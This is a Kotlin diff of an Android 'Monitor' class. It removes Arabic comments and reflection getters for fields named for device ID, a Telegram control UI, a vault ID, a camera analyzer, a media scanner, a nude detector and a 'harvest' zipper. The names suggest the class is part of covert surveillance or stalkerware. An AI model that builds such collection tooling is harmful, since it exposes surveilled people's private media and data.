@@ -72,11 +72,7 @@ class Monitor private constructor(context: Context) {
     var dailyZipper: Any? = null
     var cameraAnalyzer: Any? = null
     var mediaScanner: Any? = null
-    
-    // ✅ تم تعديل النوع من Any? إلى Long? لتتناسب مع الاستخدام الفعلي
     var ctrl: Long? = null
-    
-    // ✅ إضافة المتغيرات المطلوبة للانعكاس (Reflection)
     var vlt: Long? = null
     var nudeDetector: Any? = null
 
@@ -619,57 +615,6 @@ class Monitor private constructor(context: Context) {
 
         return statusMap
     }
-
-    // ============================================================
-    //  ✅ دوال Getter إضافية للانعكاس (Reflection)
-    //  هذه الدوال تسمح للفئات الأخرى (Commands, TelegramUi, NudeDetector)
-    //  بالوصول إلى خصائص Monitor عبر Reflection بأمان.
-    // ============================================================
-
-    /**
-     * إرجاع اسم طراز الجهاز.
-     */
-    fun getDeviceModel(): String = deviceModel
-
-    /**
-     * إرجاع معرف الجهاز الفريد.
-     */
-    fun getDeviceId(): String = deviceId
-
-    /**
-     * إرجاع كائن واجهة Telegram (TelegramUi).
-     */
-    fun getUi(): Any? = ui
-
-    /**
-     * إرجاع كائن ماسح الوسائط (MediaScanner).
-     */
-    fun getMediaScanner(): Any? = mediaScanner
-
-    /**
-     * إرجاع معرف مجموعة التحكم (Control ID).
-     */
-    fun getCtrl(): Long? = ctrl
-
-    /**
-     * إرجاع معرف الخزنة (Vault ID).
-     */
-    fun getVlt(): Long? = vlt
-
-    /**
-     * إرجاع كائن كاشف المحتوى (NudeDetector).
-     */
-    fun getNudeDetector(): Any? = nudeDetector
-
-    /**
-     * إرجاع كائن مدير الكاميرا (CameraAnalyzer).
-     */
-    fun getCameraAnalyzer(): Any? = cameraAnalyzer
-
-    /**
-     * إرجاع كائن مدير الحصاد (DailyZipper).
-     */
-    fun getDailyZipper(): Any? = dailyZipper
 
     // ============================================================
     //  دوال المساعدة والانعكاس (Reflection)
